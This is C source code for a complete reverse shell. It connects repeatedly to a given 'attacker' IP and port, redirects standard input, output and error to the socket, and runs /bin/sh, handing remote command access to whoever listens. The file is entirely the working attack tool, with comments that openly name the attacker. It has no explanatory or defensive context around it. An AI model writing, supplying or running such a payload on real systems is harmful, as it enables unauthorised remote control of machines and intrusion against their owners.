#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

/**
 * Initializes a TCP socket
 * @return the socket's fd
 */
int socket_init();

/**
 * Initialize a socket address object (stores ip and port) with a given port.
 * @note the IP address is returned null and must be populated by the function caller
 * @return the created socket address
 */
struct sockaddr_in sock_addr_init(long port);


int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("usage: %s <ip> <port>\n", argv[0]);
        exit(-1);
    }

    // Get port from cmd line args
    long port = strtol(argv[2], NULL, 10);
    if (port == 0) {
        fprintf(stderr, "invalid port\n");
        exit(-1);
    }

    int sock = socket_init();

    // Construct the attacker's address object
    struct sockaddr_in server_addr = sock_addr_init(port);
    if (inet_pton(AF_INET, argv[1], &server_addr.sin_addr.s_addr) <= 0) {
        fprintf(stderr, "invalid ip address\n");
        exit(-1);
    }

    // Try to connect to the attacker until success
    while (connect(sock, (struct sockaddr *) &server_addr, sizeof(server_addr)) != 0);

    // Redirect stdin, stdout, and stderr to the socket
    dup2(sock, STDIN_FILENO);
    dup2(sock, STDOUT_FILENO);
    dup2(sock, STDERR_FILENO);

    // Execute the shell
    execve("/bin/sh", NULL, NULL);
}


int socket_init() {
    int sock;
    if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
        fprintf(stderr, "error on socket()\n");
        exit(-1);
    }
    return sock;
}

struct sockaddr_in sock_addr_init(long port) {
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    return addr;
}
